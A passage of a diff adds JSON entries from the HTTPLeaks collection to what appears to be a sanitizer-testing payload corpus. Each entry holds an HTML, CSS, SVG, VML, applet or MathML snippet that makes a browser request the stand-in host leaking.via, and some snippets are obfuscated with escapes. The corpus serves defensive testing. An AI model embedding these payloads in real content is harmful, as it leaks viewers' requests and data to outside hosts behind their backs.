+			"payload_html": "<style>\n    /* Basic font-face */\n    @font-face {\n        font-family: leak;\n        src: url(https://leaking.via/css-font-face-src);\n    }\n    \n    /* \n    * Cross-browser font-face\n    * IE6-8 will use the EOT source, modern browsers will use WOFF(2) and fallback to TTF in case of error\n    * More info:\n    * http://www.paulirish.com/2009/bulletproof-font-face-implementation-syntax/\n    * http://caniuse.com/#search=eot\n    * http://caniuse.com/#search=woff2\n    * http://caniuse.com/#search=woff\n    * http://caniuse.com/#search=ttf\n    */\n    @font-face {\n      font-family: 'leak';\n      src: url('https://leaking.via/css-font-face-src-eot') format('eot'), url('https://leaking.via/css-font-face-src-woff') format('woff'), url('https://leaking.via/css-font-face-src-ttf') format('truetype');\n    }\n\n    big {\n        font-family: leak;\n    }\n</style>\n<big>GHI</big>\n<svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-e253af6f8b",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/svg-css-fill#foo).",
+			"payload_html": "    <style>\n        circle {\n            fill: url(https://leaking.via/svg-css-fill#foo);\n            mask: url(https://leaking.via/svg-css-mask#foo);\n            -webkit-mask: url(https://leaking.via/svg-css--webkit-mask#foo);\n            filter: url(https://leaking.via/svg-css-filter#foo);\n            clip-path: url(https://leaking.via/svg-css-clip-path#foo);\n        stroke: url(https://leaking.via/svg-inline-css-stroke#foo);\n        }\n    </style>\n    <circle r=\"40\"></circle>\n</svg>\n<s foo=\"https://leaking.via/css-attr-notation\">JKL</s>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-8ae6c248e7",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-variables).",
+			"payload_html": "<style>\n    s {\n      --leak: url(https://leaking.via/css-variables);\n    }\n    s {\n      background: var(--leak);\n    }\n    s::after {\n      content: attr(foo url);\n    }    \n    s::before {\n      content: attr(notpresent, url(https://leaking.via/css-attr-fallback));\n    }\n</style>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-f85ae6a768",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-escape-url-1).",
+			"payload_html": "<style>\n    p#p1 {\n        background-image: \\75 \\72 \\6C (https://leaking.via/css-escape-url-1);\n    }\n    p#p2 {\n        background-image: \\000075\\000072\\00006C(https://leaking.via/css-escape-url-2);\n    }\n</style>\n<p id=\"p1\">bla</p>\n<p id=\"p2\">bla</p>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-inline-css-b-1472af1627",
+			"description": "HTTPLeaks leak.html: Inline CSS: <b> snippet (https://leaking.via/inline-css-list-style).",
+			"payload_html": "<b style=\"\n        list-style: url(https://leaking.via/inline-css-list-style);\n        list-style-image: url&#40;https://leaking.via/inline-css-list-style-image&#41;;\n        background: url&#x28;https://leaking.via/inline-css-background&#x29;;\n        background-image: url&lpar;https://leaking.via/inline-css-background-image&rpar;;\n        border-image: url(https://leaking.via/inline-css-list-style-image);\n        -moz-border-image: url(https://leaking.via/inline-css--moz-background-image-alias);\n        -webkit-border-image: url(https://leaking.via/inline-css--webkit-background-image-alias);\n        border-image-source: url(https://leaking.via/inline-css-border-image-source);\n        shape-outside: url(https://leaking.via/inline-css-shape-outside);\n        -webkit-shape-outside: url(https://leaking.via/inline-css--webkit-shape-outside-alias);\n        -webkit-mask-image: url(https://leaking.via/inline-css--webkit-mask-image);\n        -webkit-mask-box-image: url(https://leaking.via/inline-css--webkit-mask-box-image);\n        -webkit-mask-box-image-source: url(https://leaking.via/inline-css--webkit-mask-box-image-source);\n        cursor: url(https://leaking.via/inline-css-cursor), auto;\n\">MNO</b>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-inline-css-svg-f156f24bc9",
+			"description": "HTTPLeaks leak.html: Inline CSS: <svg> snippet (https://leaking.via/svg-inline-css-fill#foo).",
+			"payload_html": "<svg>\n<circle style=\"\n        fill: url(https://leaking.via/svg-inline-css-fill#foo);\n        mask: url(https://leaking.via/svg-inline-css-mask#foo);\n        -webkit-mask: url(https://leaking.via/svg-inline-css--webkit-mask#foo);\n        filter: url(https://leaking.via/svg-inline-css-filter#foo);\n        clip-path: url(https://leaking.via/svg-inline-css-clip-path#foo);\n\"></circle>\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-288d696842",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-multiple-backgrounds).",
+			"payload_html": "<div style=\"background: url() url() url() url() url(https://leaking.via/inline-css-multiple-backgrounds);\"></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-2adcb3cb0a",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-behavior).",
+			"payload_html": "<div style=\"behavior: url('https://leaking.via/inline-css-behavior');\"></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-8f6cf3713d",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-behavior-2).",
+			"payload_html": "<div style=\"-ms-behavior: url('https://leaking.via/inline-css-behavior-2');\"></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-9e6f6c92be",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-image-function).",
+			"payload_html": "<div style=\"background-image: image('https://leaking.via/inline-css-image-function')\"></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-e855c27dc3",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-filter-alpha).",
+			"payload_html": "<div style=\"filter:progid:DXImageTransform.Microsoft.AlphaImageLoader( src='https://leaking.via/inline-css-filter-alpha', sizingMethod='scale');\" ></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-exotic-inline-css-div-a0ef03accb",
+			"description": "HTTPLeaks leak.html: Exotic Inline CSS: <div> snippet (https://leaking.via/inline-css-filter-icm).",
+			"payload_html": "<div style=\"filter:progid:DXImageTransform.Microsoft.ICMFilter(colorSpace='https://leaking.via/inline-css-filter-icm')\"></div>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-applet-applet-0c0918d7a8",
+			"description": "HTTPLeaks leak.html: Applet: <applet> snippet (https://leaking.via/applet-codebase).",
+			"payload_html": "<applet code=\"Test\" codebase=\"https://leaking.via/applet-codebase\"></applet>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-applet-applet-6b55b942ac",
+			"description": "HTTPLeaks leak.html: Applet: <applet> snippet (https://leaking.via/applet-archive).",
+			"payload_html": "<applet code=\"Test\" archive=\"https://leaking.via/applet-archive\"></applet>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-applet-applet-7ad673ed52",
+			"description": "HTTPLeaks leak.html: Applet: <applet> snippet (https://leaking.via/applet-object).",
+			"payload_html": "<applet code=\"Test\" object=\"https://leaking.via/applet-object\"></applet>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-de5bde0516",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-fill).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <defs>\n    <linearGradient id=\"Gradient\">\n      <stop offset=\"0\" stop-color=\"white\" stop-opacity=\"0\" />\n      <stop offset=\"1\" stop-color=\"white\" stop-opacity=\"1\" />\n    </linearGradient>\n    <mask id=\"Mask\">\n      <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" fill=\"url(https://leaking.via/svg-fill)\"  />\n    </mask>\n  </defs>\n  <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" fill=\"green\" />\n  <rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" fill=\"red\" mask=\"url(https://leaking.via/svg-mask)\" />\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-dd83756f45",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-image-set).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n    <image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n        <set attributeName=\"xlink:href\" begin=\"0s\" to=\"https://leaking.via/svg-image-set\" />\n    </image>\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-c5d989658e",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-image-animate).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n    <image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n        <animate attributeName=\"xlink:href\" begin=\"0s\" from=\"#\" to=\"https://leaking.via/svg-image-animate\" />\n    </image>\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-d4cbc7dda7",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-feimage).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n    <feImage xlink:href=\"https://leaking.via/svg-feimage\" />\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-340a6dbcae",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-a-text/).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n    <a xlink:href=\"https://leaking.via/svg-a-text/\"><text transform=\"translate(0,20)\">CLICKME</text></a>\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-cf1e5183fc",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-cursor).",
+			"payload_html": "<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\">\n    <rect cursor=\"url(https://leaking.via/svg-cursor),auto\" />\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-svg-svg-bd2f06409e",
+			"description": "HTTPLeaks leak.html: SVG: <svg> snippet (https://leaking.via/svg-font-face-uri).",
+			"payload_html": "<svg>\n    <font-face-uri xlink:href=\"https://leaking.via/svg-font-face-uri\" />\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-xslt-stylesheets-snippet-1dd877976c",
+			"description": "HTTPLeaks leak.html: XSLT Stylesheets: <snippet> snippet (https://leaking.via/xslt-stylesheet).",
+			"payload_html": "<?xml-stylesheet type=\"text/xsl\" href=\"https://leaking.via/xslt-stylesheet\" ?>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-data-islands-xml-fe70408f52",
+			"description": "HTTPLeaks leak.html: Data Islands: <xml> snippet (https://leaking.via/xml-src).",
+			"payload_html": "<xml src=\"https://leaking.via/xml-src\" id=\"xml\"></xml>\n<div datasrc=\"#xml\" datafld=\"$text\" dataformatas=\"html\"></div>\n<script language=\"xml\">\n    <!DOCTYPE html SYSTEM \"https://leaking.via/script-doctype\">\n</script>\n<xml>\n    <!DOCTYPE html SYSTEM \"https://leaking.via/xml-doctype\">\n</xml>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-vml-line-960ac7df3b",
+			"description": "HTTPLeaks leak.html: VML: <line> snippet (https://leaking.via/vml-line-fill-src).",
+			"payload_html": "<line xmlns=\"urn:schemas-microsoft-com:vml\" style=\"behavior:url(#default#vml)\">\n    <fill style=\"behavior:url(#default#vml)\" src=\"https://leaking.via/vml-line-fill-src\" />\n    <stroke style=\"behavior:url(#default#vml)\" src=\"https://leaking.via/vml-line-stroke-src\" />\n    <imageData style=\"behavior:url(#default#vml)\" src=\"https://leaking.via/vml-line-imgdata-src\" />\n</line>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-vml-vmlframe-f9cff2a68b",
+			"description": "HTTPLeaks leak.html: VML: <vmlframe> snippet (https://leaking.via/vmlframe-src#xss).",
+			"payload_html": "<vmlframe \n    xmlns=\"urn:schemas-microsoft-com:vml\" \n    style=\"behavior:url(#default#vml);position:absolute;width:100%;height:100%\" \n    src=\"https://leaking.via/vmlframe-src#xss\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-vml-line-a8ce718690",
+			"description": "HTTPLeaks leak.html: VML: <line> snippet (https://leaking.via/vml-line-imgdata-href).",
+			"payload_html": "<line xmlns=\"urn:schemas-microsoft-com:vml\" style=\"behavior:url(#default#vml)\">\n    <imageData style=\"behavior:url(#default#vml)\" o:href=\"https://leaking.via/vml-line-imgdata-href\" />\n</line>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-mathml-math-470558ffa5",
+			"description": "HTTPLeaks leak.html: MathML: <math> snippet (https://leaking.via/mathml-math).",
+			"payload_html": "<math xlink:href=\"https://leaking.via/mathml-math\">CLICKME</math>\n\n<math><mi xlink:href=\"https://leaking.via/mathml-mi\">CLICKME</mi></math>",
+			"payload_context": "http_leak"
+		}
+	]
+}
